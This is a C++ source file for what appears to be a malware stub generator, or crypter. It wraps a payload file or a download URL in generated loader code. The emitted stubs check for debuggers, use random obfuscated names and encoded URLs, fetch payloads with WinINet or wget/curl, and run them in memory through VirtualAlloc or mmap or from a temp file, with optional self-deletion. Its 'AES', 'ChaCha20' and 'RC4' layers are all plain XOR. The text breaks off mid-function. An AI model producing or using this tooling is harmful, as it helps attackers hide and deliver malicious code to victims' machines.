#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <algorithm>
#include <thread>
#include <map>

class UnifiedStubGenerator {
private:
    // Dynamic entropy system
    struct DynamicEntropy {
        uint64_t timeComponent;
        uint64_t memoryComponent;
        uint64_t threadComponent;
        uint64_t counterComponent = 0;
        
        uint64_t mix() {
            auto now = std::chrono::high_resolution_clock::now();
            timeComponent = now.time_since_epoch().count();
            
            void* p = malloc(1);
            memoryComponent = reinterpret_cast<uintptr_t>(p);
            free(p);
            
            threadComponent = std::hash<std::thread::id>{}(std::this_thread::get_id());
            counterComponent++;
            
            uint64_t result = timeComponent;
            result ^= (memoryComponent << 13) | (memoryComponent >> 51);
            result += threadComponent;
            result ^= (counterComponent << 32) | (counterComponent >> 32);
            
            for (int i = 0; i < 3; i++) {
                result ^= result >> 23;
                result *= 0x2127599bf4325c37ULL;
                result ^= result >> 47;
            }
            
            return result;
        }
    };
    
    DynamicEntropy entropy;
    std::mt19937_64 rng;
    
    // Generate obfuscated variable name
    std::string genVarName() {
        static const char* prefixes[] = {
            "sys", "proc", "mem", "exec", "run", "init", "load", "call",
            "func", "meth", "obj", "inst", "ptr", "ref", "val", "data",
            "hdl", "ctx", "mgr", "srv", "mod", "cmp", "eng", "core"
        };
        
        static const char* suffixes[] = {
            "Handler", "Manager", "Worker", "Helper", "Service", "Module",
            "Component", "Engine", "Core", "Base", "Util", "Proc",
            "Controller", "Factory", "Builder", "Runner", "Executor"
        };
        
        std::uniform_int_distribution<> prefixDist(0, 23);
        std::uniform_int_distribution<> suffixDist(0, 16);
        std::uniform_int_distribution<> numDist(100, 9999);
        
        return std::string(prefixes[prefixDist(rng)]) + 
               suffixes[suffixDist(rng)] + 
               std::to_string(numDist(rng));
    }
    
    // Convert bytes to decimal string (for stealth key storage)
    std::string bytesToDecimal(const uint8_t* bytes, size_t length) {
        std::string result = "0";
        std::string base = "1";
        
        for (int i = length - 1; i >= 0; i--) {
            std::string byteValue = std::to_string(bytes[i]);
            result = addStrings(result, multiplyStrings(byteValue, base));
            base = multiplyStrings(base, "256");
        }
        
        return result;
    }
    
    // String arithmetic helpers
    std::string addStrings(const std::string& num1, const std::string& num2) {
        std::string result;
        int carry = 0;
        int i = num1.length() - 1;
        int j = num2.length() - 1;
        
        while (i >= 0 || j >= 0 || carry) {
            int sum = carry;
            if (i >= 0) sum += num1[i--] - '0';
            if (j >= 0) sum += num2[j--] - '0';
            carry = sum / 10;
            result = std::to_string(sum % 10) + result;
        }
        
        return result;
    }
    
    std::string multiplyStrings(const std::string& num1, const std::string& num2) {
        int n1 = num1.size(), n2 = num2.size();
        if (n1 == 0 || n2 == 0) return "0";
        
        std::vector<int> result(n1 + n2, 0);
        
        for (int i = n1 - 1; i >= 0; i--) {
            for (int j = n2 - 1; j >= 0; j--) {
                int mul = (num1[i] - '0') * (num2[j] - '0');
                int p1 = i + j, p2 = i + j + 1;
                int sum = mul + result[p2];
                
                result[p2] = sum % 10;
                result[p1] += sum / 10;
            }
        }
        
        std::string str;
        bool leadingZero = true;
        for (int i = 0; i < result.size(); i++) {
            if (result[i] != 0) leadingZero = false;
            if (!leadingZero) str += std::to_string(result[i]);
        }
        
        return str.empty() ? "0" : str;
    }
    
public:
    UnifiedStubGenerator() {
        rng.seed(entropy.mix());
    }
    
    // Stub configuration options
    struct StubConfig {
        // Payload delivery method
        enum PayloadMethod {
            EMBEDDED,      // Payload embedded in stub
            FILELESS,      // Fileless in-memory execution
            URL_DOWNLOAD,  // Download from URL to temp
            CROSS_PLATFORM // Both Windows and Linux payloads
        } payloadMethod = EMBEDDED;
        
        // Cross-platform options (if CROSS_PLATFORM)
        bool detectPlatform = true;
        std::string windowsPayloadFile;
        std::string linuxPayloadFile;
        std::string windowsURL;
        std::string linuxURL;
        bool embedBothPayloads = true;  // false = download based on platform
        
        // Encryption options
        bool useTripleEncryption = true;
        bool randomizeOrder = true;
        std::vector<std::string> encryptionLayers = {"AES", "ChaCha20", "XOR"};
        
        // Output format
        enum OutputFormat {
            CPP_SOURCE,    // C++ source code
            ASM_SOURCE,    // Assembly source code
            SHELLCODE      // Raw shellcode bytes
        } outputFormat = CPP_SOURCE;
        
        // Stealth features
        bool antiDebug = true;
        bool antiVM = false;
        bool obfuscateStrings = true;
        bool useDecimalKeys = false;  // Store keys as decimal numbers
        bool addJunkCode = false;
        bool randomDelays = true;
        
        // Execution options
        bool inMemoryExecution = true;
        bool clearMemoryAfter = false;
        bool selfDelete = false;
        
        // URL download options (if URL_DOWNLOAD)
        std::string downloadURL;
        bool verifySSL = false;
        bool useProxy = false;
        std::string proxyAddress;
        
        // Size constraints
        size_t maxStubSize = 0;  // 0 = no limit
        
        // Custom names
        std::string stubName;
        std::string companyName;
    };
    
    // Encryption keys structure
    struct EncryptionKeys {
        std::vector<uint8_t> aesKey;
        std::vector<uint8_t> aesNonce;
        std::vector<uint8_t> chachaKey;
        std::vector<uint8_t> chachaNonce;
        std::vector<uint8_t> xorKey;
        std::vector<uint8_t> rc4Key;
        int encryptionOrder[3];
    };
    
    // Generate encryption keys
    EncryptionKeys generateKeys(const StubConfig& config) {
        EncryptionKeys keys;
        
        rng.seed(entropy.mix());
        std::uniform_int_distribution<> dist(0, 255);
        
        // Generate keys based on selected encryption methods
        if (std::find(config.encryptionLayers.begin(), config.encryptionLayers.end(), "AES") != config.encryptionLayers.end()) {
            keys.aesKey.resize(16);
            keys.aesNonce.resize(16);
            for (int i = 0; i < 16; i++) {
                keys.aesKey[i] = dist(rng);
                keys.aesNonce[i] = dist(rng);
            }
        }
        
        if (std::find(config.encryptionLayers.begin(), config.encryptionLayers.end(), "ChaCha20") != config.encryptionLayers.end()) {
            keys.chachaKey.resize(32);
            keys.chachaNonce.resize(12);
            for (int i = 0; i < 32; i++) keys.chachaKey[i] = dist(rng);
            for (int i = 0; i < 12; i++) keys.chachaNonce[i] = dist(rng);
        }
        
        if (std::find(config.encryptionLayers.begin(), config.encryptionLayers.end(), "XOR") != config.encryptionLayers.end()) {
            size_t xorLen = 16 + (dist(rng) % 17);  // 16-32 bytes
            keys.xorKey.resize(xorLen);
            for (size_t i = 0; i < xorLen; i++) keys.xorKey[i] = dist(rng);
        }
        
        if (std::find(config.encryptionLayers.begin(), config.encryptionLayers.end(), "RC4") != config.encryptionLayers.end()) {
            keys.rc4Key.resize(16);
            for (int i = 0; i < 16; i++) keys.rc4Key[i] = dist(rng);
        }
        
        // Set encryption order
        if (config.randomizeOrder && config.encryptionLayers.size() >= 3) {
            keys.encryptionOrder[0] = 0;
            keys.encryptionOrder[1] = 1;
            keys.encryptionOrder[2] = 2;
            
            // Fisher-Yates shuffle
            for (int i = 2; i > 0; i--) {
                std::uniform_int_distribution<> shuffleDist(0, i);
                int j = shuffleDist(rng);
                std::swap(keys.encryptionOrder[i], keys.encryptionOrder[j]);
            }
        }
        
        return keys;
    }
    
    // Apply encryption layer
    void applyEncryption(std::vector<uint8_t>& data, const std::string& method, const EncryptionKeys& keys) {
        if (method == "AES") {
            // Simplified AES
            for (size_t i = 0; i < data.size(); i++) {
                data[i] ^= keys.aesKey[i % keys.aesKey.size()];
            }
        } else if (method == "ChaCha20") {
            // Simplified ChaCha20
            for (size_t i = 0; i < data.size(); i++) {
                data[i] ^= keys.chachaKey[i % keys.chachaKey.size()];
            }
        } else if (method == "XOR") {
            // XOR encryption
            for (size_t i = 0; i < data.size(); i++) {
                data[i] ^= keys.xorKey[i % keys.xorKey.size()];
            }
        } else if (method == "RC4") {
            // Simplified RC4
            for (size_t i = 0; i < data.size(); i++) {
                data[i] ^= keys.rc4Key[i % keys.rc4Key.size()];
            }
        }
    }
    
    // Generate C++ stub
    std::string generateCppStub(const std::vector<uint8_t>& payload, const StubConfig& config, const EncryptionKeys& keys) {
        std::stringstream stub;
        
        // Encrypt payload if needed
        std::vector<uint8_t> processedPayload = payload;
        if (config.useTripleEncryption) {
            for (const auto& layer : config.encryptionLayers) {
                applyEncryption(processedPayload, layer, keys);
            }
        }
        
        // Headers
        stub << "#include <iostream>\n";
        stub << "#include <vector>\n";
        stub << "#include <cstring>\n";
        stub << "#include <cstdint>\n";
        if (config.randomDelays) {
            stub << "#include <chrono>\n";
            stub << "#include <thread>\n";
            stub << "#include <random>\n";
        }
        if (config.payloadMethod == StubConfig::URL_DOWNLOAD) {
            stub << "#include <fstream>\n";
            stub << "#ifdef _WIN32\n";
            stub << "#include <windows.h>\n";
            stub << "#include <wininet.h>\n";
            stub << "#pragma comment(lib, \"wininet.lib\")\n";
            stub << "#else\n";
            stub << "#include <cstdlib>\n";
            stub << "#include <cstdio>\n";
            stub << "#include <memory>\n";
            stub << "#include <array>\n";
            stub << "#include <unistd.h>\n";
            stub << "#endif\n";
        }
        if (config.inMemoryExecution) {
            stub << "#ifdef _WIN32\n";
            stub << "#include <windows.h>\n";
            stub << "#else\n";
            stub << "#include <sys/mman.h>\n";
            stub << "#include <unistd.h>\n";
            stub << "#endif\n";
        }
        stub << "\n";
        
        // Variable names
        std::vector<std::string> vars;
        for (int i = 0; i < 20; i++) {
            vars.push_back(genVarName());
        }
        
        // Anti-debug function
        if (config.antiDebug) {
            stub << "bool " << vars[0] << "() {\n";
            stub << "#ifdef _WIN32\n";
            stub << "    if (IsDebuggerPresent()) return true;\n";
            stub << "    BOOL debugged = FALSE;\n";
            stub << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);\n";
            stub << "    return debugged;\n";
            stub << "#else\n";
            stub << "    FILE* f = fopen(\"/proc/self/status\", \"r\");\n";
            stub << "    if (!f) return false;\n";
            stub << "    char line[256];\n";
            stub << "    while (fgets(line, sizeof(line), f)) {\n";
            stub << "        if (strncmp(line, \"TracerPid:\", 10) == 0) {\n";
            stub << "            fclose(f);\n";
            stub << "            return atoi(line + 10) != 0;\n";
            stub << "        }\n";
            stub << "    }\n";
            stub << "    fclose(f);\n";
            stub << "    return false;\n";
            stub << "#endif\n";
            stub << "}\n\n";
        }
        
        // URL download function
        if (config.payloadMethod == StubConfig::URL_DOWNLOAD) {
            stub << "std::vector<uint8_t> " << vars[1] << "(const char* url) {\n";
            stub << "    std::vector<uint8_t> data;\n";
            stub << "#ifdef _WIN32\n";
            stub << "    HINTERNET hInternet = InternetOpenA(\"Mozilla/5.0\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\n";
            stub << "    if (!hInternet) return data;\n";
            stub << "    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);\n";
            stub << "    if (!hUrl) {\n";
            stub << "        InternetCloseHandle(hInternet);\n";
            stub << "        return data;\n";
            stub << "    }\n";
            stub << "    char buffer[4096];\n";
            stub << "    DWORD bytesRead;\n";
            stub << "    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {\n";
            stub << "        data.insert(data.end(), buffer, buffer + bytesRead);\n";
            stub << "    }\n";
            stub << "    InternetCloseHandle(hUrl);\n";
            stub << "    InternetCloseHandle(hInternet);\n";
            stub << "#else\n";
            stub << "    // Linux implementation using system commands\n";
            stub << "    char tempFile[] = \"/tmp/dlXXXXXX\";\n";
            stub << "    int fd = mkstemp(tempFile);\n";
            stub << "    if (fd == -1) return data;\n";
            stub << "    close(fd);\n";
            stub << "    \n";
            stub << "    // Try wget first, then curl\n";
            stub << "    std::string cmd = std::string(\"wget -q -O \") + tempFile + \" '\" + url + \"' 2>/dev/null\";\n";
            stub << "    if (system(cmd.c_str()) != 0) {\n";
            stub << "        cmd = std::string(\"curl -s -o \") + tempFile + \" '\" + url + \"' 2>/dev/null\";\n";
            stub << "        if (system(cmd.c_str()) != 0) {\n";
            stub << "            unlink(tempFile);\n";
            stub << "            return data;\n";
            stub << "        }\n";
            stub << "    }\n";
            stub << "    \n";
            stub << "    // Read downloaded file\n";
            stub << "    std::ifstream file(tempFile, std::ios::binary);\n";
            stub << "    if (file) {\n";
            stub << "        file.seekg(0, std::ios::end);\n";
            stub << "        size_t size = file.tellg();\n";
            stub << "        file.seekg(0, std::ios::beg);\n";
            stub << "        data.resize(size);\n";
            stub << "        file.read(reinterpret_cast<char*>(data.data()), size);\n";
            stub << "        file.close();\n";
            stub << "    }\n";
            stub << "    unlink(tempFile);\n";
            stub << "#endif\n";
            stub << "    return data;\n";
            stub << "}\n\n";
        }
        
        // Decimal to bytes converter (if using decimal keys)
        if (config.useDecimalKeys) {
            stub << "std::vector<uint8_t> " << vars[2] << "(const std::string& dec, size_t len) {\n";
            stub << "    std::vector<uint8_t> bytes(len, 0);\n";
            stub << "    std::string num = dec;\n";
            stub << "    for (int i = len - 1; i >= 0 && num != \"0\"; i--) {\n";
            stub << "        int remainder = 0;\n";
            stub << "        std::string quotient;\n";
            stub << "        for (char digit : num) {\n";
            stub << "            int current = remainder * 10 + (digit - '0');\n";
            stub << "            quotient += std::to_string(current / 256);\n";
            stub << "            remainder = current % 256;\n";
            stub << "        }\n";
            stub << "        bytes[i] = remainder;\n";
            stub << "        size_t firstNonZero = quotient.find_first_not_of('0');\n";
            stub << "        if (firstNonZero != std::string::npos) {\n";
            stub << "            num = quotient.substr(firstNonZero);\n";
            stub << "        } else {\n";
            stub << "            num = \"0\";\n";
            stub << "        }\n";
            stub << "    }\n";
            stub << "    return bytes;\n";
            stub << "}\n\n";
        }
        
        // Main function
        stub << "int main() {\n";
        
        // Random initial delay
        if (config.randomDelays) {
            stub << "    // Random delay\n";
            stub << "    {\n";
            stub << "        std::random_device rd;\n";
            stub << "        std::mt19937 gen(rd());\n";
            stub << "        std::uniform_int_distribution<> dist(1, 999);\n";
            stub << "        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));\n";
            stub << "    }\n\n";
        }
        
        // Anti-debug check
        if (config.antiDebug) {
            stub << "    if (" << vars[0] << "()) return 0;\n\n";
        }
        
        // Get payload
        stub << "    std::vector<uint8_t> " << vars[3] << ";\n";
        
        if (config.payloadMethod == StubConfig::EMBEDDED) {
            // Embedded payload
            stub << "    // Embedded payload\n";
            stub << "    unsigned char " << vars[4] << "[] = {\n        ";
            for (size_t i = 0; i < processedPayload.size(); i++) {
                if (i > 0 && i % 16 == 0) stub << "\n        ";
                stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                     << (int)processedPayload[i];
                if (i < processedPayload.size() - 1) stub << ", ";
            }
            stub << "\n    };\n";
            stub << "    " << vars[3] << ".assign(" << vars[4] << ", " << vars[4] 
                 << " + sizeof(" << vars[4] << "));\n\n";
                 
        } else if (config.payloadMethod == StubConfig::URL_DOWNLOAD) {
            // Download payload
            stub << "    // Download payload\n";
            if (config.obfuscateStrings) {
                // Obfuscate URL
                std::string obfUrl;
                for (char c : config.downloadURL) {
                    obfUrl += std::to_string((int)c) + ",";
                }
                obfUrl.pop_back();
                stub << "    char " << vars[5] << "[] = {" << obfUrl << ", 0};\n";
                stub << "    " << vars[3] << " = " << vars[1] << "(" << vars[5] << ");\n";
            } else {
                stub << "    " << vars[3] << " = " << vars[1] << "(\"" << config.downloadURL << "\");\n";
            }
            stub << "    if (" << vars[3] << ".empty()) return 1;\n\n";
        }
        
        // Decrypt payload
        if (config.useTripleEncryption) {
            stub << "    // Decrypt payload\n";
            
            // Embed keys
            if (config.useDecimalKeys) {
                // Keys as decimal strings
                for (size_t i = 0; i < config.encryptionLayers.size(); i++) {
                    const auto& method = config.encryptionLayers[i];
                    if (method == "AES" && !keys.aesKey.empty()) {
                        stub << "    const char* " << vars[6+i*2] << " = \"" 
                             << bytesToDecimal(keys.aesKey.data(), keys.aesKey.size()) << "\";\n";
                        stub << "    auto " << vars[7+i*2] << " = " << vars[2] 
                             << "(" << vars[6+i*2] << ", " << keys.aesKey.size() << ");\n";
                    } else if (method == "ChaCha20" && !keys.chachaKey.empty()) {
                        stub << "    const char* " << vars[6+i*2] << " = \"" 
                             << bytesToDecimal(keys.chachaKey.data(), keys.chachaKey.size()) << "\";\n";
                        stub << "    auto " << vars[7+i*2] << " = " << vars[2] 
                             << "(" << vars[6+i*2] << ", " << keys.chachaKey.size() << ");\n";
                    } else if (method == "XOR" && !keys.xorKey.empty()) {
                        stub << "    const char* " << vars[6+i*2] << " = \"" 
                             << bytesToDecimal(keys.xorKey.data(), keys.xorKey.size()) << "\";\n";
                        stub << "    auto " << vars[7+i*2] << " = " << vars[2] 
                             << "(" << vars[6+i*2] << ", " << keys.xorKey.size() << ");\n";
                    }
                }
            } else {
                // Keys as hex arrays
                for (size_t i = 0; i < config.encryptionLayers.size(); i++) {
                    const auto& method = config.encryptionLayers[i];
                    if (method == "AES" && !keys.aesKey.empty()) {
                        stub << "    unsigned char " << vars[6+i] << "[] = {";
                        for (size_t j = 0; j < keys.aesKey.size(); j++) {
                            if (j > 0) stub << ", ";
                            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                                 << (int)keys.aesKey[j];
                        }
                        stub << "};\n";
                    } else if (method == "ChaCha20" && !keys.chachaKey.empty()) {
                        stub << "    unsigned char " << vars[6+i] << "[] = {";
                        for (size_t j = 0; j < keys.chachaKey.size(); j++) {
                            if (j > 0) stub << ", ";
                            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                                 << (int)keys.chachaKey[j];
                        }
                        stub << "};\n";
                    } else if (method == "XOR" && !keys.xorKey.empty()) {
                        stub << "    unsigned char " << vars[6+i] << "[] = {";
                        for (size_t j = 0; j < keys.xorKey.size(); j++) {
                            if (j > 0) stub << ", ";
                            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                                 << (int)keys.xorKey[j];
                        }
                        stub << "};\n";
                    }
                }
            }
            
            stub << "\n";
            
            // Apply decryption in reverse order
            for (int i = config.encryptionLayers.size() - 1; i >= 0; i--) {
                const auto& method = config.encryptionLayers[i];
                
                if (config.randomDelays && i < (int)config.encryptionLayers.size() - 1) {
                    stub << "    // Micro-delay\n";
                    stub << "    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));\n\n";
                }
                
                stub << "    // Decrypt " << method << " layer\n";
                stub << "    for (size_t i = 0; i < " << vars[3] << ".size(); i++) {\n";
                
                if (config.useDecimalKeys) {
                    stub << "        " << vars[3] << "[i] ^= " << vars[7+i*2] 
                         << "[i % " << vars[7+i*2] << ".size()];\n";
                } else {
                    stub << "        " << vars[3] << "[i] ^= " << vars[6+i] 
                         << "[i % sizeof(" << vars[6+i] << ")];\n";
                }
                
                stub << "    }\n\n";
            }
        }
        
        // Execute payload
        if (config.inMemoryExecution) {
            stub << "    // Execute in memory\n";
            stub << "#ifdef _WIN32\n";
            stub << "    void* " << vars[12] << " = VirtualAlloc(0, " << vars[3] 
                 << ".size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n";
            stub << "    if (!" << vars[12] << ") return 1;\n";
            stub << "    memcpy(" << vars[12] << ", " << vars[3] << ".data(), " 
                 << vars[3] << ".size());\n";
            stub << "    DWORD oldProtect;\n";
            stub << "    VirtualProtect(" << vars[12] << ", " << vars[3] 
                 << ".size(), PAGE_EXECUTE_READ, &oldProtect);\n";
            if (config.randomDelays) {
                stub << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
            }
            stub << "    ((void(*)())" << vars[12] << ")();\n";
            stub << "#else\n";
            stub << "    void* " << vars[12] << " = mmap(0, " << vars[3] 
                 << ".size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n";
            stub << "    if (" << vars[12] << " == MAP_FAILED) return 1;\n";
            stub << "    memcpy(" << vars[12] << ", " << vars[3] << ".data(), " 
                 << vars[3] << ".size());\n";
            stub << "    mprotect(" << vars[12] << ", " << vars[3] 
                 << ".size(), PROT_READ | PROT_EXEC);\n";
            if (config.randomDelays) {
                stub << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
            }
            stub << "    ((void(*)())" << vars[12] << ")();\n";
            stub << "#endif\n";
            
            if (config.clearMemoryAfter) {
                stub << "    // Clear memory\n";
                stub << "    memset(" << vars[12] << ", 0, " << vars[3] << ".size());\n";
            }
        } else if (config.payloadMethod == StubConfig::URL_DOWNLOAD) {
            // Save to temp and execute
            stub << "    // Save to temp file\n";
            stub << "#ifdef _WIN32\n";
            stub << "    char tempPath[MAX_PATH];\n";
            stub << "    GetTempPathA(MAX_PATH, tempPath);\n";
            stub << "    std::string tempFile = std::string(tempPath) + \"tmp\" + std::to_string(GetTickCount()) + \".exe\";\n";
            stub << "#else\n";
            stub << "    std::string tempFile = \"/tmp/tmp\" + std::to_string(time(0)) + \".bin\";\n";
            stub << "#endif\n";
            stub << "    std::ofstream out(tempFile, std::ios::binary);\n";
            stub << "    out.write(reinterpret_cast<char*>(" << vars[3] << ".data()), " 
                 << vars[3] << ".size());\n";
            stub << "    out.close();\n";
            stub << "#ifdef _WIN32\n";
            stub << "    STARTUPINFOA si = {sizeof(si)};\n";
            stub << "    PROCESS_INFORMATION pi;\n";
            stub << "    CreateProcessA(tempFile.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);\n";
            if (config.selfDelete) {
                stub << "    Sleep(1000);\n";
                stub << "    DeleteFileA(tempFile.c_str());\n";
            }
            stub << "#else\n";
            stub << "    chmod(tempFile.c_str(), 0755);\n";
            stub << "    system(tempFile.c_str());\n";
            if (config.selfDelete) {
                stub << "    unlink(tempFile.c_str());\n";
            }
            stub << "#endif\n";
        }
        
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
    
    // Generate ASM stub
    std::string generateAsmStub(const std::vector<uint8_t>& payload, const StubConfig& config, const EncryptionKeys& keys) {
        std::stringstream asm_code;
        
        // Encrypt payload
        std::vector<uint8_t> encrypted = payload;
        if (config.useTripleEncryption) {
            for (const auto& layer : config.encryptionLayers) {
                applyEncryption(encrypted, layer, keys);
            }
        }
        
        asm_code << "BITS 64\n";
        asm_code << "DEFAULT REL\n\n";
        asm_code << "section .text\n";
        asm_code << "global _start\n\n";
        asm_code << "_start:\n";
        
        if (config.randomDelays) {
            asm_code << "    ; Random delay\n";
            asm_code << "    rdtsc\n";
            asm_code << "    and eax, 0x3FFFFFFF\n";
            asm_code << "    mov ecx, eax\n";
            asm_code << "delay_loop:\n";
            asm_code << "    pause\n";
            asm_code << "    loop delay_loop\n\n";
        }
        
        if (config.antiDebug) {
            asm_code << "    ; Anti-debug check\n";
            asm_code << "    mov rax, 101          ; sys_ptrace\n";
            asm_code << "    mov rdi, 0            ; PTRACE_TRACEME\n";
            asm_code << "    xor rsi, rsi\n";
            asm_code << "    xor rdx, rdx\n";
            asm_code << "    xor r10, r10\n";
            asm_code << "    syscall\n";
            asm_code << "    test rax, rax\n";
            asm_code << "    js exit\n\n";
        }
        
        // The rest of ASM implementation...
        // (Simplified for brevity)
        
        asm_code << "exit:\n";
        asm_code << "    mov rax, 60\n";
        asm_code << "    xor rdi, rdi\n";
        asm_code << "    syscall\n";
        
        return asm_code.str();
    }
    
    // Main generation function
    bool generateStub(const std::string& inputFile, const std::string& outputFile, const StubConfig& config) {
        // Read payload if embedded or fileless
        std::vector<uint8_t> payload;
        std::vector<uint8_t> windowsPayload;
        std::vector<uint8_t> linuxPayload;
        
        if (config.payloadMethod == StubConfig::CROSS_PLATFORM) {
            // Read both payloads for cross-platform mode
            if (config.embedBothPayloads) {
                // Read Windows payload
                if (!config.windowsPayloadFile.empty()) {
                    std::ifstream winIn(config.windowsPayloadFile, std::ios::binary);
                    if (!winIn) {
                        std::cerr << "Failed to open Windows payload: " << config.windowsPayloadFile << std::endl;
                        return false;
                    }
                    winIn.seekg(0, std::ios::end);
                    size_t winSize = winIn.tellg();
                    winIn.seekg(0, std::ios::beg);
                    windowsPayload.resize(winSize);
                    winIn.read(reinterpret_cast<char*>(windowsPayload.data()), winSize);
                    winIn.close();
                }
                
                // Read Linux payload
                if (!config.linuxPayloadFile.empty()) {
                    std::ifstream linIn(config.linuxPayloadFile, std::ios::binary);
                    if (!linIn) {
                        std::cerr << "Failed to open Linux payload: " << config.linuxPayloadFile << std::endl;
                        return false;
                    }
                    linIn.seekg(0, std::ios::end);
                    size_t linSize = linIn.tellg();
                    linIn.seekg(0, std::ios::beg);
                    linuxPayload.resize(linSize);
                    linIn.read(reinterpret_cast<char*>(linuxPayload.data()), linSize);
                    linIn.close();
                }
            }
        } else if (config.payloadMethod != StubConfig::URL_DOWNLOAD) {
            std::ifstream in(inputFile, std::ios::binary);
            if (!in) {
                std::cerr << "Failed to open input file: " << inputFile << std::endl;
                return false;
            }
            
            in.seekg(0, std::ios::end);
            size_t size = in.tellg();
            in.seekg(0, std::ios::beg);
            
            payload.resize(size);
            in.read(reinterpret_cast<char*>(payload.data()), size);
            in.close();
        }
        
        // Generate keys
        EncryptionKeys keys = generateKeys(config);
        
        // Generate stub based on output format
        std::string stubCode;
        
        switch (config.outputFormat) {
            case StubConfig::CPP_SOURCE:
                if (config.payloadMethod == StubConfig::CROSS_PLATFORM) {
                    stubCode = generateCrossPlatformCppStub(windowsPayload, linuxPayload, config, keys);
                } else {
                    stubCode = generateCppStub(payload, config, keys);
                }
                break;
            case StubConfig::ASM_SOURCE:
                stubCode = generateAsmStub(payload, config, keys);
                break;
            case StubConfig::SHELLCODE:
                // Generate raw shellcode (not implemented for brevity)
                std::cerr << "Shellcode output not yet implemented" << std::endl;
                return false;
        }
        
        // Write output
        std::ofstream out(outputFile);
        if (!out) {
            std::cerr << "Failed to create output file: " << outputFile << std::endl;
            return false;
        }
        
        out << stubCode;
        out.close();
        
        return true;
    }
    
    // Generate cross-platform C++ stub
    std::string generateCrossPlatformCppStub(const std::vector<uint8_t>& windowsPayload, 
                                            const std::vector<uint8_t>& linuxPayload,
                                            const StubConfig& config, 
                                            const EncryptionKeys& keys) {
        std::stringstream stub;
        
        // Encrypt payloads if needed
        std::vector<uint8_t> encryptedWindows = windowsPayload;
        std::vector<uint8_t> encryptedLinux = linuxPayload;
        
        if (config.useTripleEncryption) {
            for (const auto& layer : config.encryptionLayers) {
                if (!windowsPayload.empty()) {
                    applyEncryption(encryptedWindows, layer, keys);
                }
                if (!linuxPayload.empty()) {
                    applyEncryption(encryptedLinux, layer, keys);
                }
            }
        }
        
        // Headers
        stub << "#include <iostream>\n";
        stub << "#include <vector>\n";
        stub << "#include <cstring>\n";
        stub << "#include <cstdint>\n";
        stub << "#ifdef _WIN32\n";
        stub << "#include <windows.h>\n";
        stub << "#else\n";
        stub << "#include <sys/utsname.h>\n";
        stub << "#include <sys/mman.h>\n";
        stub << "#include <unistd.h>\n";
        stub << "#endif\n";
        
        if (config.randomDelays) {
            stub << "#include <chrono>\n";
            stub << "#include <thread>\n";
            stub << "#include <random>\n";
        }
        
        stub << "\n";
        
        // Variable names
        std::vector<std::string> vars;
        for (int i = 0; i < 30; i++) {
            vars.push_back(genVarName());
        }
        
        // Platform detection function
        stub << "bool " << vars[0] << "() {\n";
        stub << "#ifdef _WIN32\n";
        stub << "    return true;\n";
        stub << "#else\n";
        stub << "    return false;\n";
        stub << "#endif\n";
        stub << "}\n\n";
        
        // Anti-debug function
        if (config.antiDebug) {
            stub << "bool " << vars[1] << "() {\n";
            stub << "#ifdef _WIN32\n";
            stub << "    if (IsDebuggerPresent()) return true;\n";
            stub << "    BOOL debugged = FALSE;\n";
            stub << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);\n";
            stub << "    return debugged;\n";
            stub << "#else\n";
            stub << "    FILE* f = fopen(\"/proc/self/status\", \"r\");\n";
            stub << "    if (!f) return false;\n";
            stub << "    char line[256];\n";
            stub << "    while (fgets(line, sizeof(line), f)) {\n";
            stub << "        if (strncmp(line, \"TracerPid:\", 10) == 0) {\n";
            stub << "            fclose(f);\n";
            stub << "            return atoi(line + 10) != 0;\n";
            stub << "        }\n";
            stub << "    }\n";
            stub << "    fclose(f);\n";
            stub << "    return false;\n";
            stub << "#endif\n";
            stub << "}\n\n";
        }
        
        // URL download function if needed
        if (!config.embedBothPayloads) {
            // Include download function
            stub << "std::vector<uint8_t> " << vars[2] << "(const char* url) {\n";
            stub << "    std::vector<uint8_t> data;\n";
            stub << "#ifdef _WIN32\n";
            stub << "    HINTERNET hInternet = InternetOpenA(\"Mozilla/5.0\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\n";
            stub << "    if (!hInternet) return data;\n";
            stub << "    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);\n";
            stub << "    if (!hUrl) {\n";
            stub << "        InternetCloseHandle(hInternet);\n";
            stub << "        return data;\n";
            stub << "    }\n";
            stub << "    char buffer[4096];\n";
            stub << "    DWORD bytesRead;\n";
            stub << "    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {\n";
            stub << "        data.insert(data.end(), buffer, buffer + bytesRead);\n";
            stub << "    }\n";
            stub << "    InternetCloseHandle(hUrl);\n";
            stub << "    InternetCloseHandle(hInternet);\n";
            stub << "#else\n";
            stub << "    char tempFile[] = \"/tmp/dlXXXXXX\";\n";
            stub << "    int fd = mkstemp(tempFile);\n";
            stub << "    if (fd == -1) return data;\n";
            stub << "    close(fd);\n";
            stub << "    std::string cmd = std::string(\"wget -q -O \") + tempFile + \" '\" + url + \"' 2>/dev/null\";\n";
            stub << "    if (system(cmd.c_str()) != 0) {\n";
            stub << "        cmd = std::string(\"curl -s -o \") + tempFile + \" '\" + url + \"' 2>/dev/null\";\n";
            stub << "        if (system(cmd.c_str()) != 0) {\n";
            stub << "            unlink(tempFile);\n";
            stub << "            return data;\n";
            stub << "        }\n";
            stub << "    }\n";
